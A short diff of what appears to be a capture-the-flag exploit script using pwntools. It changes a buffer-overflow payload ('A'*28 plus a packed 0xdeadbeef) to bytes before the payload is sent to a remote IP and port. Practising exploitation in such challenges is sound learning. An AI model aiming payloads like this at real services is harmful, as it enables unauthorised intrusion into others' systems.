@@ -49,7 +49,7 @@ from pwn import *
 #r = process('./pass')
 r = remote('120.114.62.213', 6125)
 
-payload = 'A'*28
+payload = b'A'*28
 
 r.sendline(payload + p64(0xdeadbeef))
 
